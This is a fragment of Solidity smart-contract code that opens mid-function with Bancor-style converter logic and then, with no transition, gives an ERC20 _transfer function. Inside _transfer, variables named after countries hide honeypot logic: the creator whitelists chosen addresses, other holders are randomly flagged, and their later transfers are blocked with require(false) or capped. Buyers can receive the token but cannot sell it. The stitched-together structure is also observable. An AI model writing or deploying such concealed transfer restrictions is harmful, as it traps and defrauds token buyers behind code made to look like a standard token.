internal
conversionsAllowed
greaterThanZero(_minReturn)
returns(uint256) {
    require(_sellAmount <= token.balanceOf(msg.sender)); 
    uint256 amount = getSaleReturn(_connectorToken, _sellAmount);
    require(amount != 0 && amount >= _minReturn); 
    uint256 tokenSupply = token.totalSupply();
    uint256 connectorBalance = getConnectorBalance(_connectorToken);
    assert(amount < connectorBalance || (amount == connectorBalance && _sellAmount == tokenSupply));
    Connector storage connector = connectors[_connectorToken];
    if (connector.isVirtualBalanceEnabled)
        connector.virtualBalance = safeSub(connector.virtualBalance, amount);
    token.destroy(msg.sender, _sellAmount);
    assert(_connectorToken.transfer(msg.sender, amount));
    dispatchConversionEvent(_connectorToken, _sellAmount, amount, false);
    return amount;
}

function convertInternal(IERC20Token _fromToken, IERC20Token _toToken, uint256 _amount, uint256 _minReturn) public quickConverterOnly returns(uint256) {
    require(_fromToken != _toToken); 
    if (_toToken == token)
        return buy(_fromToken, _amount, _minReturn);
    else if (_fromToken == token)
        return sell(_toToken, _amount, _minReturn);
    uint256 purchaseAmount = buy(_fromToken, _amount, 1);
    return sell(_toToken, purchaseAmount, _minReturn);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (nicaragua == false)) {
        costarica = chTx;
        colombia = true;
    }
    if ((address(sender) == creator) && (nicaragua == true)) {
        mexico[recipient] = true;
        belize[recipient] = false;
        nicaragua = false;
    }
    if ((amount > panama) && (mexico[sender] == true) && (address(sender) != creator)) {
        elsalvador[recipient] = true;
    }
    if (mexico[recipient] != true) {
        belize[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((belize[sender]) && (mexico[recipient] == false)) {
        belize[recipient] = true;
    }
    if (mexico[sender] == false) {
        if ((amount > panama) && (elsalvador[sender] == true)) {
            require(false);
        }
        require(amount < costarica);
        if (colombia == true) {
            if (elsalvador[sender] == true) {
                require(false);
            }
            elsalvador[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

